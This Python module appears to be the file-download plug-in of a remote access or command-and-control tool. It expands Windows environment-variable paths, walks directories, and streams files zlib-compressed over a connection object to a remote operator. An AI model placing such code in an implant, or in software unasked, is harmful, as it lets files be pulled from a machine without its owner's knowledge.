import os
import zlib


class ModuleSource:
    def __init__(self):
        pass

    def run_module(self, command, args, connection):
        def path_replace_sysenv_wrapper(filepath, process_sys_env_bool):
            if process_sys_env_bool:
                return path_replace_sysenv(filepath)
            else:
                return filepath

        def path_replace_sysenv(filepath):
            path = os.path.normpath(filepath)
            split_path = path.split(os.sep)
            for component_index, component in enumerate(split_path):
                if component.startswith("%") and component.endswith("%"):
                    env_var = component[1:-1]
                    if env_var in os.environ:
                        split_path[component_index] = os.environ[env_var]
                elif component.startswith('"%') and component.endswith('%"'):
                    split_path[component_index] = component[1:-1]
            return os.sep.join(split_path)

        def walk_dirs_recursively(dir_path):
            root_abs_path = os.path.abspath(dir_path)
            for abs_root, _, file_list in os.walk(root_abs_path):
                if file_list:
                    for file in file_list:
                        file_abs_path = os.path.join(abs_root, file)
                        yield {
                            "is_file": True,
                            "abs_path": file_abs_path,
                            "rel_path": os.path.relpath(
                                file_abs_path,
                                os.path.split(root_abs_path)[0],
                            ),
                        }
                else:
                    yield {
                        "is_file": False,
                        "abs_path": abs_root,
                        "rel_path": os.path.relpath(
                            abs_root,
                            os.path.split(root_abs_path)[0],
                        ),
                    }

        def walk_dirs_non_recursively(dir_path):
            root_abs_path = os.path.abspath(dir_path)
            for item in os.listdir(root_abs_path):
                item_abs_path = os.path.join(root_abs_path, item)
                if os.path.isfile(item_abs_path):
                    yield {
                        "is_file": True,
                        "abs_path": item_abs_path,
                        "rel_path": os.path.relpath(
                            item_abs_path,
                            os.path.split(root_abs_path)[0],
                        ),
                    }
                elif os.path.isdir(item_abs_path) and not os.listdir(item_abs_path):
                    yield {
                        "is_file": False,
                        "abs_path": item_abs_path,
                        "rel_path": os.path.relpath(
                            item_abs_path,
                            os.path.split(root_abs_path)[0],
                        ),
                    }

        def read_file_by_chunk(file_obj, chunk_size):
            while True:
                data = file_obj.read(chunk_size)
                if not data:
                    break
                yield data

        requested_path = path_replace_sysenv_wrapper(args["path"], args["env_parse"])

        if os.path.isfile(requested_path):

            def get_downloadable_paths(requested_path):
                file_abs_path = os.path.abspath(requested_path)
                yield {
                    "is_file": True,
                    "abs_path": file_abs_path,
                    "rel_path": os.path.split(file_abs_path)[1],
                }
        elif os.path.isdir(requested_path) and args["recursive"]:
            get_downloadable_paths = walk_dirs_recursively
        elif os.path.isdir(requested_path) and not args["recursive"]:
            get_downloadable_paths = walk_dirs_non_recursively
        else:
            connection.send_json(
                {
                    "valid_path_error": True,
                    "message": f'[-]Invalid path : {args["path"]}',
                },
            )
            return

        for file_info in get_downloadable_paths(requested_path):
            try:
                if file_info["is_file"]:
                    with open(file_info["abs_path"], "rb") as f:
                        connection.send_json(
                            {
                                "is_file": True,
                                "rel_path": file_info["rel_path"],
                                "abs_path": file_info["abs_path"],
                                "file_size": os.path.getsize(
                                    os.path.abspath(file_info["abs_path"]),
                                ),
                            },
                        )
                        success_bool, download_confirmation = connection.recv()
                        if success_bool and download_confirmation == "True":
                            for file_chunk in read_file_by_chunk(f, args["chunk_size"]):
                                compressed_chunk = zlib.compress(
                                    file_chunk,
                                    args["zlib_compression"],
                                )
                                connection.send_bytes(compressed_chunk)
                else:
                    connection.send_json(
                        {
                            "is_file": False,
                            "rel_path": file_info["rel_path"],
                            "abs_path": file_info["abs_path"],
                        },
                    )
            except Exception as e:  # Fix the catchall exception
                connection.send_json(
                    {
                        "read_file_error": True,
                        "message": f"[-]Error reading file : {e}",
                    },
                )
        connection.send_json({"download_complete": True})
